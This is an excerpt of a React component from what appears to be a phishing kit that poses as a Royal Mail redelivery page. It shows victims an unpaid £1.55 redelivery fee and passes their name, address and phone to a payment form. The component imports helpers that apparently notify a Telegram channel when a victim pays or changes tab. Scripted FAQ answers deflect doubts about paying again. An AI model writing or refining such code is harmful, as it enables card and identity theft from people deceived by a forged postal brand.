...
import { sendPaymentAcceptedNotification, sendPageHiddenNotification, sendPageVisibleNotification } from "./tgapi";
...
const ReviewForm = ({
  ...
  useEffect(() => {
    if (showPaymentForm) return; // Don't track when payment form is shown
    
    const handleVisibilityChange = () => {
      const clientIdentifier = name || "Unknown Client";
  ...
  if (showPaymentForm) {
    return <PaymentForm onComplete={() => setIsSubmitted(true)} amount="£1.55" name={name} address={address} city={city} postCode={postCode} phone={phone} />;
  }
  if (isSubmitted) {
  ...
  return <div className="space-y-6 animate-fade-in mx-[11px] px-[11px]">
        ...
        <CardContent className="px-6 mx-0 py-4 my-0">
          ...
          <div className="flex items-center text-sm font-semibold mb-2 -mt-4">
            <span className="relative inline-block drop-shadow-sm">
                <span className="relative z-10">Review delivery details</span>
              </span>
          </div>
          ...
          <div className="space-y-2 mt-4">
            ...
            const showSpacer = item.label === "Selected Date";
            return <div key={index}>
              {showSpacer && <div className="h-4"></div>}
              <div className={`group flex items-center space-x-4 ${item.label === "Delivery Time" || item.label === "Contact Number" ? "mb-4" : ""} relative`} style={{
                animationDelay: `${index * 0.1}s`
                    ...
                    {(item.label === "Delivery Time" || item.label === "Contact Number") && (
                      <div className="absolute -bottom-2 left-0 right-4 h-px border-b border-gray-200"></div>
                    )}
                  </div>
                </div>;
          })}
        ...
        <CardContent className="px-4 mx-0 my-[5px] py-0">
          ...
          <div className="flex items-center justify-between text-sm font-semibold mb-2 -mt-4">
            <div className="flex items-center">
              ...
              <span className="relative inline-block drop-shadow-sm">
                <span className="relative z-10 text-gray-700 text-sm">Redelivery fees</span>
              </span>
            </div>
          ...
          <div className="mt-4">
            ...
            <div className="">
              ...
              >
                <div className="flex items-center">
                  <p className="text-gray-700 font-medium text-[11px]">Shipping</p>
                  {isShippingExpanded ? (
              ...
              {isShippingExpanded && (
                <div className="flex justify-between items-start pb-3 border-b border-gray-200 animate-fade-in">
                  <div>
                    <p className="text-[11px] text-gray-700">Royal Mail Standard</p>
                  </div>
                  <div className="text-right">
                    <p className="text-gray-700 font-semibold text-xs">£1.55</p>
                    <p className="text-[11px] text-gray-700">Paid on Aug 13</p>
                  </div>
                </div>
              )}
            </div>
            ...
            <div className="border-b border-gray-200">
              <div 
                className="flex justify-between items-center cursor-pointer py-2" 
                onClick={() => setIsRedeliveryExpanded(!isRedeliveryExpanded)}
              >
                <div className="flex items-center">
                  <p className="text-gray-700 font-medium text-[11px]">Redelivery</p>
              ...
              {isRedeliveryExpanded && (
                <div className="flex justify-between items-start pb-3 animate-fade-in">
                  <div>
                    <p className="text-[11px] text-gray-700">Standard Redelivery</p>
                  </div>
                  <div className="text-right">
                    <p className="text-gray-700 font-semibold text-xs">£1.55</p>
                    <p className="text-[11px] text-gray-700">Unpaid</p>
                  </div>
                </div>
              )}
            </div>
            ...
            <div className="flex justify-center pb-4">
              <Button 
                ...
                className="w-auto px-6 py-2 bg-gradient-to-r from-green-400 to-green-500 hover:from-green-500 hover:to-green-600 text-white shadow-lg hover:shadow-xl transition-all duration-300 text-sm font-semibold rounded-lg hover:scale-105 active:scale-95"
              >
                Continue
              </Button>
            </div>
      ...
      <div className="space-y-2 px-4 pb-4 mt-4 text-center">
        <div 
          className="text-xs text-gray-600 underline cursor-pointer hover:text-gray-800 font-chevin font-thin"
          onClick={() => setSelectedFAQ(selectedFAQ === 1 ? null : 1)}
        >
          Why do I need to pay again?
        </div>
        {selectedFAQ === 1 && (
          <div className="text-xs text-gray-700 bg-gray-50 p-2 rounded ml-2 font-chevin text-center">
            The original delivery fee covers the first attempt. A redelivery fee applies for rescheduling to a new date.
          </div>
        )}
        
        <div 
          className="text-xs text-gray-600 underline cursor-pointer hover:text-gray-800 font-chevin font-thin"
          onClick={() => setSelectedFAQ(selectedFAQ === 2 ? null : 2)}
        >
          Why not call me first?
        </div>
        {selectedFAQ === 2 && (
          <div className="text-xs text-gray-700 bg-gray-50 p-2 rounded ml-2 font-chevin text-center">
            We attempted delivery but couldn't reach you. Check your contact details are correct for future deliveries.
          </div>
        )}
        
        <div 
          className="text-xs text-gray-600 underline cursor-pointer hover:text-gray-800 font-chevin font-thin"
          onClick={() => setSelectedFAQ(selectedFAQ === 3 ? null : 3)}
        >
          Why can't you try one more time?
        </div>
        {selectedFAQ === 3 && (
          <div className="text-xs text-gray-700 bg-gray-50 p-2 rounded ml-2 font-chevin text-center">
            We've already made the required delivery attempts. You can collect from your local depot or book a redelivery.
          </div>
        )}
        
        <div 
          className="text-xs text-gray-600 underline cursor-pointer hover:text-gray-800 font-chevin font-thin"
          onClick={() => setSelectedFAQ(selectedFAQ === 4 ? null : 4)}
        >
          Why can't you hold it until tomorrow?
        </div>
        {selectedFAQ === 4 && (
          <div className="text-xs text-gray-700 bg-gray-50 p-2 rounded ml-2 font-chevin text-center">
            Items are held for 18 days at your local depot. Redelivery allows you to choose a convenient time slot.
          </div>
        )}
      </div>
    </div>;
